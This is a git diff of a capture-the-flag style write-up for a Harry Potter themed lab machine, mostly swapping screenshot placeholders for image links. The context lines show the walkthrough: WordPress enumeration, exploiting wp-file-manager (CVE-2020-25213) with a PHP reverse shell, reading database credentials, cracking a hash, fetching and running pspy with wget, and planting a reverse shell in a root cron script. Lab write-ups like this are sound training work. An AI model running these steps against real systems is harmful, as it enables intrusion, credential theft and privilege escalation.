@@ -33,17 +33,17 @@ Found that port 22 runs SSH and port 80 is a web server we should definitely loo
 
 Visited http://192.168.56.102 and got the Harry Potter picture for their site.
 
-[INSERT SCREENSHOT: browser showing HP image]
+<img width="1087" height="649" alt="HPSite" src="https://github.com/user-attachments/assets/870b65e1-8e68-4502-9f2f-186730b85826" />
+
 
 I am now going to do a directory brute-force to find any hidden directories using gobuster.
 
 `gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirb/common.txt`
 
-[INSERT SCREENSHOT: gobuster results showing /blog]
+<img width="832" height="678" alt="dirbuster" src="https://github.com/user-attachments/assets/6d9ec212-bb00-4e47-aac5-e4bd307508bc" />
+
 
 Found /blog. When visited, it reveals a WordPress site.
-
-[INSERT SCREENSHOT: browser showing WordPress blog]
 
 ---
 
@@ -53,7 +53,8 @@ Now I will scan the WordPress site using WPScan to find any vulns.
 
 `wpscan --url http://192.168.56.102/blog/ --enumerate ap --plugins-detection aggressive`
 
-[INSERT SCREENSHOT: wpscan results showing wp-file-manager]
+<img width="1690" height="1264" alt="wpscan" src="https://github.com/user-attachments/assets/5433cc32-4422-466c-8afd-582551119313" />
+
 
 Found an out-of-date wp-file-manager plugin that is vulnerable to unauthenticated arbitrary file upload (CVE-2020-25213). I can upload a PHP reverse shell directly to the server.
 
@@ -67,11 +68,13 @@ Cloned the GitHub repository for the exploit.
 
 Need to change the IP and port in the payload file to point back to my Kali machine.
 
-[INSERT SCREENSHOT: payload.php with IP and port set]
+<img width="672" height="258" alt="SettinhUpExploit" src="https://github.com/user-attachments/assets/20821e18-401a-4a79-b396-8dff772a3df2" />
 
 Started listener, as the reverse shell will connect back to me.
 
 `nc -lvnp 1234`
+
+<img width="511" height="71" alt="StartListener" src="https://github.com/user-attachments/assets/7cb4e99b-c705-4ba3-9337-3f5bd3ba2892" />
 
 Ran the exploit and then triggered the shell.
 
@@ -79,7 +82,8 @@ Ran the exploit and then triggered the shell.
 
 `curl http://192.168.56.102/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php`
 
-[INSERT SCREENSHOT: reverse shell connection received]
+<img width="1053" height="838" alt="RunningExploitAct" src="https://github.com/user-attachments/assets/a612c342-55c3-4abb-8956-a435061b4b32" />
+
 
 Got a reverse shell as www-data.
 
@@ -97,7 +101,7 @@ Found WordPress database credentials by locating wp-config.php with find, which 
 
 `cat /etc/wordpress/config-default.php`
 
-[INSERT SCREENSHOT: wp-config contents showing DB credentials]
+<img width="685" height="227" alt="FindingDBPAssword" src="https://github.com/user-attachments/assets/576537f0-4b5b-4261-af6e-b39ff6d78f77" />
 
 Credentials found:
 - User: root
@@ -107,9 +111,11 @@ Got into the database using the password.
 
 `mysql -u root -pmySecr3tPass`
 
+<img width="787" height="222" alt="GotintoDatabase" src="https://github.com/user-attachments/assets/9b36faed-cfa1-48e8-92b4-608e4f3069fd" />
+
 Found hagrid98's password hash in the wp_users table.
 
-[INSERT SCREENSHOT: MySQL query showing password hash]
+<img width="816" height="265" alt="FoundHash" src="https://github.com/user-attachments/assets/b92ba9b1-3d5d-4a00-8e62-7440217c463b" />
 
 ---
 
@@ -119,7 +125,7 @@ Used John the Ripper to crack the hash.
 
 `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
 
-[INSERT SCREENSHOT: john cracking the hash]
+<img width="728" height="224" alt="UnhashPass" src="https://github.com/user-attachments/assets/0e967247-5644-41ea-b512-0fffc60d2397" />
 
 Cracked password: password123
 
@@ -129,7 +135,7 @@ Now I will SSH in as hagrid98.
 
 Got the first Horcrux.
 
-[INSERT SCREENSHOT: first horcrux flag]
+<img width="731" height="418" alt="FirstHorcrox" src="https://github.com/user-attachments/assets/edf1f1b0-b892-4620-8d0a-a6a5f4c15f90" />
 
 ---
 
@@ -141,11 +147,16 @@ Downloaded pspy and served it to the target machine to monitor processes.
 
 `python3 -m http.server 8000`
 
+<img width="896" height="559" alt="pspysetup" src="https://github.com/user-attachments/assets/4c800c6f-49cc-4656-ae7a-585960ba19a3" />
+
+
 `wget http://192.168.56.101:8000/pspy64 && chmod +x pspy64 && ./pspy64`
 
-[INSERT SCREENSHOT: pspy showing /opt/.backup.sh running as root]
+<img width="861" height="583" alt="pspyrunning" src="https://github.com/user-attachments/assets/f74b1698-02e3-49c9-adb8-4a93631f2bbd" />
 
 Ran it to see cron jobs running as root. Found that /opt/.backup.sh is executed by root periodically.
+
+<img width="823" height="135" alt="rootun" src="https://github.com/user-attachments/assets/6fd2313a-25fc-4dcb-8762-fd1cfd03c674" />
 
 Injected a reverse shell into the backup script and opened a listener waiting for the cron job to execute.
 
@@ -153,11 +164,11 @@ Injected a reverse shell into the backup script and opened a listener waiting fo
 
 `nc -lvnp 5555`
 
-[INSERT SCREENSHOT: root shell received]
+<img width="1027" height="725" alt="reverseshellandlistener" src="https://github.com/user-attachments/assets/1eb3dfcb-4c8d-4b38-8fda-ef15d84f9b1c" />
 
 Gained root and found the 2nd Horcrux.
 
-[INSERT SCREENSHOT: second horcrux flag]
+<img width="760" height="681" alt="2ndhorcrux" src="https://github.com/user-attachments/assets/17913e74-36ec-4704-b2ce-5e2494a84b62" />
 
 ---
 
